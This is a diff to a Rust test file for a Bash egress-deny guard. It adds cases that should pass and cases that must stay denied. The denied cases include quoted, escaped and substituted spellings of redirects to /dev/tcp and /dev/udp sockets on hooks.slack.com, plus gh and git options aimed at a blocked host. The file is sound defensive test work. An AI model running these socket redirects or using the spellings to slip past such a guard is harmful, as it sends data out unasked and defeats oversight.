@@ -23,6 +23,12 @@ fn mention_only_commands_pass_for_every_role_11273() {
         "cat notes/api.notion.com.txt",
         "ls docs/chat.googleapis.com",
         "cd /tmp && grep mail.google.com f | head -3",
+        // #11273 round 3: a quoted `>` is text, a prose `=` value is prose,
+        // and a here-document operator opens no file.
+        "git commit -m \"guard: a -> hooks.slack.com <b>\"",
+        "gh issue create --title=\"egress: hooks.slack.com x\" --body y",
+        "gh release create v1 --notes \"names api.slack.com\"",
+        "cat <<'EOF'\nhooks.slack.com\nEOF",
     ] {
         assert_eq!(bash_egress_deny(command), None, "{command}");
     }
@@ -63,4 +69,51 @@ fn look_alike_mentions_stay_denied_11273() {
             "{command}"
         );
     }
+}
+
+/// 🔴 #11273 review H1: a redirect to or from a socket path stays denied in
+/// every quoting and operator spelling. Each passed on 753969b1b6, which read
+/// the socket path in the raw text only.
+#[test]
+fn quoted_socket_redirects_stay_denied_11273() {
+    assert_all_denied(&[
+        "echo hi > \"/dev/\"tcp/hooks.slack.com/80",
+        "echo hi >\"/dev/\"tcp/hooks.slack.com/80",
+        "echo hi > /dev/'tcp'/hooks.slack.com/80",
+        "echo hi > /dev/\\tcp/hooks.slack.com/80",
+        "echo hi >\t\"/dev/\"tcp/hooks.slack.com/80",
+        "echo hi >> \"/dev/\"tcp/hooks.slack.com/80",
+        "cat <> \"/dev/\"tcp/hooks.slack.com/80",
+        "cat < \"/dev/\"tcp/hooks.slack.com/80",
+        "cat 0< \"/dev/\"udp/hooks.slack.com/53",
+        "echo hi 3> \"/dev/\"tcp/hooks.slack.com/80",
+        "echo hi &> \"/dev/\"tcp/hooks.slack.com/80",
+        "echo hi > $(printf /dev)/tcp/hooks.slack.com/80",
+    ]);
+}
+
+/// 🔴 #11273 review M1/L1: a `gh` repo, host or URL word that names a family
+/// host denies however it is padded or joined, and `git -C`/`--work-tree`
+/// point git at another repository's hooks. Each passed on 753969b1b6.
+#[test]
+fn padded_gh_hosts_and_git_repo_options_stay_denied_11273() {
+    assert_all_denied(&[
+        "gh issue list --repo \"hooks.slack.com/o/r \"",
+        "gh issue list --repo \" hooks.slack.com/o/r\"",
+        "gh issue list --repo \"hooks.slack.com/o/r\t\"",
+        "gh issue list --repo=\"hooks.slack.com/o/r \"",
+        "gh issue list -R \"hooks.slack.com/o/r \"",
+        "gh repo view \"https://hooks.slack.com/o/r \"",
+        "git -C /tmp/hooks.slack.com status",
+        "git --work-tree=/tmp/hooks.slack.com status",
+    ]);
+}
+
+/// Every command in `commands` is a Bash channel deny; names each that is not.
+fn assert_all_denied(commands: &[&str]) {
+    let passed: Vec<&&str> = commands
+        .iter()
+        .filter(|command| !matches!(bash_egress_deny(command), Some(BashDeny::Channel(_))))
+        .collect();
+    assert!(passed.is_empty(), "not denied: {passed:#?}");
 }
